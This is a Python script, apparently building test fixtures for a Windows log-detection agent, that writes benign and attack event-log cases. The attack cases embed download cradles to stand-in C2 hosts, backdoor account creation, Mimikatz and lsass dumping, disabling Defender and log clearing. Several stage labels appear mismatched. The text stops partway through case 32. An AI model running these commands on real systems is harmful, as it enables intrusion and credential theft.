"""
Script Khởi tạo Bộ Dữ liệu Chuẩn 40 Ca Kiểm thử vào Thư mục data01/
Phân bổ 4 nhóm:
1. 10 ca Lành tính hoàn toàn (NORMAL)
2. 10 ca Tấn công chuyên biệt theo MITRE ATT&CK (ALERT)
3. 10 ca Tấn công phức hợp cùng phiên (ALERT)
4. 10 ca Biên giới / Đa người dùng / Khác phiên (5 NORMAL + 5 ALERT)
"""
import argparse
import json
import os
import shutil
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Đảm bảo UTF-8 cho Windows console
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

BASE = Path(__file__).resolve().parent.parent  # thư mục gốc winlog-agent (file này ở core/)
TARGET_DIR = BASE / "data01"

XML_HEADER = "<Events>"
XML_FOOTER = "</Events>"


def format_win_time(dt: datetime) -> str:
    """Format thời gian chuẩn Microsoft Windows Event Viewer: YYYY-MM-DDTHH:MM:SS.0000000Z."""
    return dt.strftime("%Y-%m-%dT%H:%M:%S.0000000Z")


def create_security_event_xml(
    event_id: int,
    time_str: str,
    record_id: int,
    data_dict: dict,
    computer: str = "WORKSTATION-SOC.corp.local",
) -> str:
    """Tạo XML chuẩn cho Security Event (4624, 4625, 4648, 4688)."""
    defaults = {
        "SubjectUserSid": "S-1-5-21-3686947128-2095841011-3536572084-1001",
        "SubjectUserName": "-",
        "SubjectDomainName": "CORP",
        "SubjectLogonId": "0x3e7",
        "TargetUserSid": "S-1-5-21-3686947128-2095841011-3536572084-1002",
        "TargetUserName": "-",
        "TargetDomainName": "CORP",
        "TargetLogonId": "0x0",
        "LogonType": "2",
        "IpAddress": "-",
        "WorkstationName": "WORKSTATION-SOC",
        "Status": "0x0",
        "SubStatus": "0x0",
        "ProcessId": "0x4",
        "NewProcessId": "0x1200",
        "NewProcessName": "",
        "CommandLine": "",
        "ParentProcessName": "C:\\Windows\\System32\\explorer.exe",
    }
    merged = {**defaults, **data_dict}
    data_items = "".join([f"<Data Name='{k}'>{merged[k]}</Data>" for k in merged if merged[k] != ""])

    return (
        f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System>"
        f"<Provider Name='Microsoft-Windows-Security-Auditing' Guid='{{54849625-5478-4994-A5BA-3E3B0328C30D}}'/>"
        f"<EventID>{event_id}</EventID>"
        f"<Version>2</Version>"
        f"<Level>0</Level>"
        f"<Task>12544</Task>"
        f"<Opcode>0</Opcode>"
        f"<Keywords>0x8020000000000000</Keywords>"
        f"<TimeCreated SystemTime='{time_str}'/>"
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Correlation/>"
        f"<Execution ProcessID='4' ThreadID='204'/>"
        f"<Channel>Security</Channel>"
        f"<Computer>{computer}</Computer>"
        f"<Security/>"
        f"</System>"
        f"<EventData>{data_items}</EventData>"
        f"</Event>"
    )


def create_powershell_event_xml(
    script_text: str,
    time_str: str,
    record_id: int,
    computer: str = "WORKSTATION-SOC.corp.local",
) -> str:
    """Tạo XML chuẩn cho PowerShell Event (4104 ScriptBlock Logging)."""
    escaped_text = (
        script_text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("'", "&apos;")
        .replace('"', "&quot;")
    )
    return (
        f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System>"
        f"<Provider Name='Microsoft-Windows-PowerShell' Guid='{{a0c1853b-5c40-4b15-8766-3cf1c58f985a}}'/>"
        f"<EventID>4104</EventID>"
        f"<Version>1</Version>"
        f"<Level>3</Level>"
        f"<Task>2</Task>"
        f"<Opcode>15</Opcode>"
        f"<Keywords>0x0</Keywords>"
        f"<TimeCreated SystemTime='{time_str}'/>"
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Correlation ActivityID='{{AABBCCDD-1234-5678-ABCD-AABBCCDDEEFF}}'/>"
        f"<Execution ProcessID='4096' ThreadID='4100'/>"
        f"<Channel>Microsoft-Windows-PowerShell/Operational</Channel>"
        f"<Computer>{computer}</Computer>"
        f"<Security UserID='S-1-5-21-3686947128-2095841011-3536572084-1001'/>"
        f"</System>"
        f"<EventData>"
        f"<Data Name='MessageNumber'>1</Data>"
        f"<Data Name='MessageTotal'>1</Data>"
        f"<Data Name='ScriptBlockText'>{escaped_text}</Data>"
        f"<Data Name='ScriptBlockId'>12345678-abcd-ef01-2345-67890abcdef0</Data>"
        f"<Data Name='Path'></Data>"
        f"</EventData>"
        f"</Event>"
    )


def write_case_to_data01(
    case_id: str,
    category: str,
    ground_truth: str,
    actions: str,
    expected_stages: list,
    sec_events: list,
    ps_events: list,
):
    """Ghi ca kiểm thử vào data01/<case_id>."""
    case_dir = TARGET_DIR / case_id
    case_dir.mkdir(parents=True, exist_ok=True)

    sec_xml = XML_HEADER + "".join(sec_events) + XML_FOOTER
    ps_xml = XML_HEADER + "".join(ps_events) + XML_FOOTER

    (case_dir / "security.xml").write_text(sec_xml, encoding="utf-8")
    (case_dir / "powershell.xml").write_text(ps_xml, encoding="utf-8")

    manifest = {
        "case_id": case_id,
        "category": category,
        "ground_truth": ground_truth,
        "actions": actions,
        "expected_stages": expected_stages,
        "security_count": len(sec_events),
        "powershell_count": len(ps_events),
        "created_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    (case_dir / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print(f"  [+] ({category:<12}) {case_id:<36} | {ground_truth:<6} | Sec: {len(sec_events):<2} | PS: {len(ps_events):<2}")


# ==============================================================================
# HÀM TẠO 40 CA KIỂM THỬ ĐẦY ĐỦ
# ==============================================================================

def generate_all_40_cases():
    base = datetime(2026, 10, 26, 8, 0, 0)

    # --------------------------------------------------------------------------
    # NHÓM 1: 10 CA LÀNH TÍNH (NORMAL)
    # --------------------------------------------------------------------------
    # 1. Office
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 101, {"TargetUserName": "user_office", "LogonType": "2"}))
    for i, app in enumerate(["OUTLOOK.EXE", "EXCEL.EXE", "WINWORD.EXE", "chrome.exe"], 1):
        sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=i*5)), 101+i, {
            "SubjectUserName": "user_office", "NewProcessName": f"C:\\Program Files\\{app}", "CommandLine": app
        }))
    write_case_to_data01("case_normal_01_office", "Benign", "NORMAL", "Nhân viên văn phòng mở Outlook, Excel, Word, Chrome làm việc.", [], sec, ps)

    # 2. Sysadmin
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 201, {"TargetUserName": "admin_sys", "LogonType": "2"}))
    for i, (proc, cmd) in enumerate([("ipconfig.exe", "ipconfig /all"), ("ping.exe", "ping 8.8.8.8 -n 4"), ("hostname.exe", "hostname")], 1):
        sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=i*5)), 201+i, {
            "SubjectUserName": "admin_sys", "NewProcessName": f"C:\\Windows\\System32\\{proc}", "CommandLine": cmd
        }))
    ps.append(create_powershell_event_xml("Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 10", format_win_time(base + timedelta(seconds=20)), 210))
    write_case_to_data01("case_normal_02_sysadmin", "Benign", "NORMAL", "Quản trị viên kiểm tra mạng và trạng thái dịch vụ.", [], sec, ps)

    # 3. Developer
    sec, ps = [], []
    for i, cmd in enumerate(["git clone https://github.com/repo/demo.git", "git status", "python -m unittest tests", "docker ps"], 1):
        sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=i*6)), 301+i, {
            "SubjectUserName": "dev_user", "NewProcessName": "C:\\Program Files\\Git\\bin\\git.exe", "CommandLine": cmd
        }))
    ps.append(create_powershell_event_xml("$env:NODE_ENV='test'; npm test", format_win_time(base + timedelta(seconds=30)), 310))
    write_case_to_data01("case_normal_03_developer", "Benign", "NORMAL", "Lập trình viên chạy Git, Unit test Python và build NPM.", [], sec, ps)

    # 4. Typo login
    sec, ps = [], []
    sec.append(create_security_event_xml(4625, format_win_time(base), 401, {"TargetUserName": "user_typo", "LogonType": "2", "Status": "0xC000006D"}))
    sec.append(create_security_event_xml(4624, format_win_time(base + timedelta(seconds=5)), 402, {"TargetUserName": "user_typo", "LogonType": "2"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=10)), 403, {"SubjectUserName": "user_typo", "NewProcessName": "notepad.exe", "CommandLine": "notepad.exe"}))
    write_case_to_data01("case_normal_04_typo_login", "Benign", "NORMAL", "Người dùng gõ nhầm pass 1 lần rồi đăng nhập đúng và mở Notepad.", [], sec, ps)

    # 5. Backup script
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 501, {"SubjectUserName": "backup_svc", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -File backup.ps1"}))
    ps.append(create_powershell_event_xml("Compress-Archive -Path D:\\Data -DestinationPath E:\\Backup.zip -Force", format_win_time(base + timedelta(seconds=3)), 502))
    write_case_to_data01("case_normal_05_backup_script", "Benign", "NORMAL", "Script PowerShell định kỳ nén file sao lưu dữ liệu.", [], sec, ps)

    # 6. Disk cleanup
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 601, {"SubjectUserName": "admin_sys", "NewProcessName": "cleanmgr.exe", "CommandLine": "cleanmgr.exe /sagerun:1"}))
    ps.append(create_powershell_event_xml("Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free", format_win_time(base + timedelta(seconds=5)), 602))
    write_case_to_data01("case_normal_06_disk_cleanup", "Benign", "NORMAL", "Quản trị viên dọn dẹp ổ đĩa và kiểm tra dung lượng còn trống.", [], sec, ps)

    # 7. Browser work
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 701, {"TargetUserName": "hr_staff", "LogonType": "2"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 702, {"SubjectUserName": "hr_staff", "NewProcessName": "chrome.exe", "CommandLine": "chrome.exe https://portal.office.com"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=8)), 703, {"SubjectUserName": "hr_staff", "NewProcessName": "OneDrive.exe", "CommandLine": "OneDrive.exe /background"}))
    write_case_to_data01("case_normal_07_browser_work", "Benign", "NORMAL", "Nhân viên nhân sự duyệt web cổng thông tin và đồng bộ OneDrive.", [], sec, ps)

    # 8. PDF reader
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 801, {"SubjectUserName": "accountant", "NewProcessName": "AcroRd32.exe", "CommandLine": "AcroRd32.exe Invoice_October.pdf"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=10)), 802, {"SubjectUserName": "accountant", "NewProcessName": "splwow64.exe", "CommandLine": "splwow64.exe 0"}))
    write_case_to_data01("case_normal_08_pdf_reader", "Benign", "NORMAL", "Mở hóa đơn PDF và tiến trình in ấn văn bản Windows.", [], sec, ps)

    # 9. Calc and Tools
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 901, {"SubjectUserName": "user_general", "NewProcessName": "calc.exe", "CommandLine": "calc.exe"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 902, {"SubjectUserName": "user_general", "NewProcessName": "taskmgr.exe", "CommandLine": "taskmgr.exe"}))
    write_case_to_data01("case_normal_09_calc_and_tools", "Benign", "NORMAL", "Mở máy tính tính tiền và mở Task Manager kiểm tra ứng dụng.", [], sec, ps)

    # 10. PowerShell Profile
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1001, {"SubjectUserName": "domain_admin", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -NoExit"}))
    ps.append(create_powershell_event_xml("Import-Module ActiveDirectory -WarningAction SilentlyContinue; Write-Host 'Admin console ready.'", format_win_time(base + timedelta(seconds=2)), 1002))
    write_case_to_data01("case_normal_10_powershell_profile", "Benign", "NORMAL", "PowerShell khởi chạy nạp module quản trị Active Directory hợp lệ.", [], sec, ps)

    # --------------------------------------------------------------------------
    # NHÓM 2: 10 CA TẤN CÔNG CHUYÊN BIỆT (ALERT)
    # --------------------------------------------------------------------------
    # 11. Bruteforce
    sec, ps = [], []
    for i in range(8):
        sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=i*3)), 1101+i, {
            "TargetUserName": "admin_backup", "LogonType": "3", "IpAddress": "10.10.15.66"
        }))
    sec.append(create_security_event_xml(4624, format_win_time(base + timedelta(seconds=28)), 1120, {"TargetUserName": "admin_backup", "LogonType": "3", "IpAddress": "10.10.15.66"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=32)), 1121, {"SubjectUserName": "admin_backup", "NewProcessName": "cmd.exe", "CommandLine": "cmd.exe"}))
    write_case_to_data01("case_attack_01_bruteforce", "SpecificAttack", "ALERT", "Dò mật khẩu 8 lần liên tiếp từ IP lạ rồi đăng nhập thành công.", ["Password Brute Force (MITRE T1110)"], sec, ps)

    # 12. PowerShell C2 Download
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1201, {
        "SubjectUserName": "compromised_user", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -w hidden -nop -enc SQBFAFgAIAA..."
    }))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://c2-malicious.xyz/beacon.ps1')", format_win_time(base + timedelta(seconds=2)), 1202))
    write_case_to_data01("case_attack_02_ps_c2_download", "SpecificAttack", "ALERT", "PowerShell Download Cradle tải và thực thi mã độc C2 từ xa.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 13. Backdoor Account
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1301, {"SubjectUserName": "attacker", "NewProcessName": "net.exe", "CommandLine": "net user shadow_admin P@ssw0rd999# /add"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 1302, {"SubjectUserName": "attacker", "NewProcessName": "net.exe", "CommandLine": "net localgroup Administrators shadow_admin /add"}))
    write_case_to_data01("case_attack_03_backdoor_account", "SpecificAttack", "ALERT", "Lệnh tạo user ẩn và cấp quyền Administrators.", ["Backdoor Creation / Privilege Escalation (MITRE T1136 / T1098)"], sec, ps)

    # 14. Mimikatz Dump
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1401, {"SubjectUserName": "attacker", "NewProcessName": "whoami.exe", "CommandLine": "whoami /priv"}))
    ps.append(create_powershell_event_xml("Invoke-Mimikatz -DumpCreds -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\" exit'", format_win_time(base + timedelta(seconds=4)), 1402))
    write_case_to_data01("case_attack_04_mimikatz_dump", "SpecificAttack", "ALERT", "Chạy Mimikatz trích xuất mật khẩu bộ nhớ tiến trình lsass.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 15. Recon Discovery
    sec, ps = [], []
    sec.append(create_security_event_xml(4625, format_win_time(base), 1501, {"TargetUserName": "recon_target", "LogonType": "3"}))
    sec.append(create_security_event_xml(4625, format_win_time(base+timedelta(seconds=2)), 1502, {"TargetUserName": "recon_target", "LogonType": "3"}))
    sec.append(create_security_event_xml(4625, format_win_time(base+timedelta(seconds=4)), 1503, {"TargetUserName": "recon_target", "LogonType": "3"}))
    for i, cmd in enumerate(["whoami", "net user", "net group \"Domain Admins\" /domain", "systeminfo", "nltest /dclist:"], 1):
        sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=10+i*3)), 1504+i, {
            "SubjectUserName": "recon_target", "NewProcessName": f"{cmd.split()[0]}.exe", "CommandLine": cmd
        }))
    write_case_to_data01("case_attack_05_recon_discovery", "SpecificAttack", "ALERT", "Chuỗi lệnh trinh sát hệ thống và miền trong chuỗi tấn công.", ["System Reconnaissance (MITRE T1033)"], sec, ps)

    # 16. Registry Persistence
    sec, ps = [], []
    ps.append(create_powershell_event_xml("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdater' -Value 'C:\\Temp\\backdoor.exe'", format_win_time(base), 1601))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=3)), 1602, {"SubjectUserName": "attacker", "NewProcessName": "reg.exe", "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Temp\\backdoor.exe /f"}))
    write_case_to_data01("case_attack_06_reg_persistence", "SpecificAttack", "ALERT", "Gán Registry Run Key duy trì khởi động mã độc.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 17. Encoded PowerShell
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1701, {
        "SubjectUserName": "attacker", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ..."
    }))
    ps.append(create_powershell_event_xml("iex (New-Object Net.WebClient).DownloadString('http://malware-drop.ru/payload.ps1')", format_win_time(base + timedelta(seconds=2)), 1702))
    write_case_to_data01("case_attack_07_encoded_powershell", "SpecificAttack", "ALERT", "Thực thi PowerShell mã hóa Base64 tải payload từ xa.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 18. Schtasks Persistence
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1801, {
        "SubjectUserName": "attacker", "NewProcessName": "schtasks.exe", "CommandLine": "schtasks /create /sc minute /mo 15 /tn \"TelemetryUpdate\" /tr \"powershell.exe -w hidden -enc aQBl...\""
    }))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://c2.server/task.ps1')", format_win_time(base + timedelta(seconds=3)), 1802))
    write_case_to_data01("case_attack_08_schtasks_persistence", "SpecificAttack", "ALERT", "Tạo Scheduled Task định kỳ 15 phút gọi PowerShell tải mã độc.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 19. Procdump LSASS
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 1901, {"SubjectUserName": "Administrator", "NewProcessName": "whoami.exe", "CommandLine": "whoami /priv"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=4)), 1902, {
        "SubjectUserName": "Administrator", "NewProcessName": "procdump.exe", "CommandLine": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
    }))
    ps.append(create_powershell_event_xml("Invoke-Mimikatz -Command '\"sekurlsa::minidump C:\\Windows\\Temp\\lsass.dmp\" \"sekurlsa::logonpasswords\" exit'", format_win_time(base + timedelta(seconds=8)), 1903))
    write_case_to_data01("case_attack_09_procdump_lsass", "SpecificAttack", "ALERT", "Dump bộ nhớ tiến trình lsass và trích xuất mật khẩu.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 20. Disable Defender
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 2001, {"SubjectUserName": "attacker", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true"}))
    ps.append(create_powershell_event_xml("Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true; IEX (New-Object Net.WebClient).DownloadString('http://evil.org/agent.ps1')", format_win_time(base + timedelta(seconds=3)), 2002))
    write_case_to_data01("case_attack_10_disable_defender", "SpecificAttack", "ALERT", "Tắt tính năng giám sát thời gian thực của Windows Defender và tải C2.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # --------------------------------------------------------------------------
    # NHÓM 3: 10 CA TẤN CÔNG PHỨC HỢP CÙNG PHIÊN (ALERT)
    # --------------------------------------------------------------------------
    # 21. Office Macro C2
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 2101, {"SubjectUserName": "hr_victim", "NewProcessName": "WINWORD.EXE", "CommandLine": "WINWORD.EXE Resume.docm"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=3)), 2102, {"SubjectUserName": "hr_victim", "NewProcessName": "cmd.exe", "CommandLine": "cmd.exe /c powershell -ep bypass -w hidden (New-Object Net.WebClient).DownloadString('http://rev.c2/s.ps1')"}))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://rev.c2/s.ps1')", format_win_time(base + timedelta(seconds=5)), 2103))
    write_case_to_data01("case_mixed_01_office_macro_c2", "MultiStageAttack", "ALERT", "Mở tài liệu Word chứa macro tự động kích hoạt PowerShell tải reverse shell.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 22. Bruteforce to Backdoor
    sec, ps = [], []
    for i in range(5):
        sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=i*3)), 2201+i, {"TargetUserName": "operator", "LogonType": "3"}))
    sec.append(create_security_event_xml(4624, format_win_time(base + timedelta(seconds=18)), 2210, {"TargetUserName": "operator", "LogonType": "3"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=22)), 2211, {"SubjectUserName": "operator", "NewProcessName": "net.exe", "CommandLine": "net user backdoor_adm Hack123! /add"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=25)), 2212, {"SubjectUserName": "operator", "NewProcessName": "net.exe", "CommandLine": "net localgroup Administrators backdoor_adm /add"}))
    write_case_to_data01("case_mixed_02_bruteforce_to_backdoor", "MultiStageAttack", "ALERT", "Dò pass thành công và ngay lập tức tạo tài khoản backdoor.", ["Password Brute Force (MITRE T1110)", "Backdoor Creation / Privilege Escalation (MITRE T1136 / T1098)"], sec, ps)

    # 23. Recon then Mimikatz
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 2301, {"SubjectUserName": "Administrator", "NewProcessName": "whoami.exe", "CommandLine": "whoami /priv"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 2302, {"SubjectUserName": "Administrator", "NewProcessName": "systeminfo.exe", "CommandLine": "systeminfo"}))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://tool.lab/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds", format_win_time(base + timedelta(seconds=10)), 2303))
    write_case_to_data01("case_mixed_03_recon_then_mimikatz", "MultiStageAttack", "ALERT", "Trinh sát đặc quyền hệ thống sau đó chạy script Mimikatz dump pass.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 24. Dev malicious package
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 2401, {"SubjectUserName": "dev_lead", "NewProcessName": "git.exe", "CommandLine": "git pull origin master"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=4)), 2402, {"SubjectUserName": "dev_lead", "NewProcessName": "npm.cmd", "CommandLine": "npm install colors-security-update"}))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://npm-typo.org/steal_token.ps1')", format_win_time(base + timedelta(seconds=8)), 2403))
    write_case_to_data01("case_mixed_04_dev_malicious_package", "MultiStageAttack", "ALERT", "Gói thư viện lập trình độc hại âm thầm kích hoạt PowerShell đánh cắp token.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 25. Sysadmin hijacked session
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 2501, {"TargetUserName": "admin_chief", "LogonType": "2"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 2502, {"SubjectUserName": "admin_chief", "NewProcessName": "cmd.exe", "CommandLine": "net user shadow_root Pass@123 /add"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=8)), 2503, {"SubjectUserName": "admin_chief", "NewProcessName": "cmd.exe", "CommandLine": "net localgroup Administrators shadow_root /add"}))
    write_case_to_data01("case_mixed_05_sysadmin_hijacked_session", "MultiStageAttack", "ALERT", "Phiên quản trị viên bị chèn lệnh độc hại tạo user quản trị.", ["Backdoor Creation / Privilege Escalation (MITRE T1136 / T1098)"], sec, ps)

    # 26. C2 and EventLog Clear
    sec, ps = [], []
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://threat.net/implant.ps1')", format_win_time(base), 2601))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 2602, {"SubjectUserName": "attacker", "NewProcessName": "wevtutil.exe", "CommandLine": "wevtutil cl Security"}))
    write_case_to_data01("case_mixed_06_c2_and_eventlog_clear", "MultiStageAttack", "ALERT", "Tải mã độc C2 sau đó thực thi lệnh xóa nhật ký Security.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 27. Browser Exploit Payload
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 2701, {"SubjectUserName": "clerk", "NewProcessName": "chrome.exe", "CommandLine": "chrome.exe http://exploit-kit.biz"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=3)), 2702, {"SubjectUserName": "clerk", "NewProcessName": "cmd.exe", "CommandLine": "cmd.exe /c powershell -w hidden -enc SQBFAFgAIAA..."}))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://exploit-kit.biz/meterpreter.ps1')", format_win_time(base + timedelta(seconds=5)), 2703))
    write_case_to_data01("case_mixed_07_browser_exploit_payload", "MultiStageAttack", "ALERT", "Trình duyệt dính mã khai thác tạo tiến trình PowerShell tải Meterpreter.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 28. Pass the Hash CMD
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 2801, {"TargetUserName": "admin_dom", "LogonType": "3", "IpAddress": "192.168.10.99"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=4)), 2802, {"SubjectUserName": "admin_dom", "NewProcessName": "wmic.exe", "CommandLine": "wmic process call create \"cmd.exe /c net user /add pth_user P@ss\""}))
    write_case_to_data01("case_mixed_08_pass_the_hash_cmd", "MultiStageAttack", "ALERT", "Đăng nhập qua mạng từ IP lạ kèm gọi WMI tạo user từ xa.", ["Backdoor Creation / Privilege Escalation (MITRE T1136 / T1098)"], sec, ps)

    # 29. Stealth Persistence Run
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 2901, {"SubjectUserName": "accountant", "NewProcessName": "EXCEL.EXE", "CommandLine": "EXCEL.EXE Budget.xlsx"}))
    ps.append(create_powershell_event_xml("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsServiceHost' -Value 'C:\\Temp\\rev.exe'", format_win_time(base + timedelta(seconds=4)), 2902))
    write_case_to_data01("case_mixed_09_stealth_persistence_run", "MultiStageAttack", "ALERT", "Chỉnh sửa Excel đồng thời tiến trình ngầm cài đặt khóa Run duy trì mã độc.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 30. Recon Domain Trust
    sec, ps = [], []
    for i in range(4):
        sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=i*2)), 3001+i, {"TargetUserName": "scanner", "LogonType": "3"}))
    for i, cmd in enumerate(["nltest /dclist:corp", "net group \"Domain Admins\" /domain", "whoami /all"], 1):
        sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=12+i*3)), 3010+i, {
            "SubjectUserName": "scanner", "NewProcessName": f"{cmd.split()[0]}.exe", "CommandLine": cmd
        }))
    write_case_to_data01("case_mixed_10_recon_domain_trust", "MultiStageAttack", "ALERT", "Dò pass và trinh sát Domain Controllers trong chuỗi tấn công.", ["Password Brute Force (MITRE T1110)", "System Reconnaissance (MITRE T1033)"], sec, ps)

    # --------------------------------------------------------------------------
    # NHÓM 4: 10 CA BIÊN GIỚI & KHÁC TÀI KHOẢN (5 ALERT + 5 NORMAL)
    # --------------------------------------------------------------------------
    # 31. Multi user one attack
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 3101, {"TargetUserName": "user_a", "LogonType": "2"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 3102, {"SubjectUserName": "user_a", "NewProcessName": "WINWORD.EXE", "CommandLine": "WINWORD.EXE"}))
    for i in range(6):
        sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=i*3)), 3110+i, {"TargetUserName": "user_b", "LogonType": "3", "IpAddress": "172.16.0.4"}))
    write_case_to_data01("case_edge_01_multi_user_one_attack", "EdgeCase", "ALERT", "User A làm việc bình thường, User B bị dò mật khẩu 6 lần liên tiếp.", ["Password Brute Force (MITRE T1110)"], sec, ps)

    # 32. Admin typo twice
    sec, ps = [], []
    sec.append(create_security_event_xml(4625, format_win_time(base), 3201, {"TargetUserName": "admin_corp", "LogonType": "2"}))
    sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=3)), 3202, {"TargetUserName": "admin_corp", "LogonType": "2"}))
    sec.append(create_security_event_xml(4624, format_win_time(base + timedelta(seconds=8)), 3203, {"TargetUserName": "admin_corp", "LogonType": "2"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=12)), 3204, {"SubjectUserName": "admin_corp", "NewProcessName": "ipconfig.exe", "CommandLine": "ipconfig"}))
